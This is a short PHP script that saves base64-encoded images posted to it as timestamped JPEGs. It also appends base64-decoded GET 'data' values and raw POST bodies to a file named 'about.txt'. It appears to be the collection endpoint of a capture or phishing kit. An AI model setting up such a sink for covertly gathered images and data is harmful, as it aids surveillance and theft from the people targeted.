<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
    if (!file_exists('uploads')) {
        mkdir('uploads', 0777, true);
    }
    
    $img = $_POST['image'];
    $image_parts = explode(";base64,", $img);
    $image_base64 = base64_decode($image_parts[1]);
    $filename = 'uploads/' . date('Y-m-d_H-i-s') . '.jpg';
    
    file_put_contents($filename, $image_base64);
}

$data = '';
$timestamp = date('Y-m-d H:i:s') . " -> ";
if (isset($_GET['data'])) {
    $decoded = base64_decode($_GET['data']);
    $data .= "\n". $timestamp . "GET: " . $decoded . "\n";
}

$rawPost = file_get_contents('php://input');
if ($rawPost !== false && $rawPost !== '') {
    $data .= "\n". $timestamp . "POST: " . trim($rawPost) . "\n";
}

if (!empty($data)) {
    $result = file_put_contents('about.txt', $data, FILE_APPEND);
    if ($result === false) {
        error_log("Write failed: " . print_r(error_get_last(), true));
    }
}
?>   
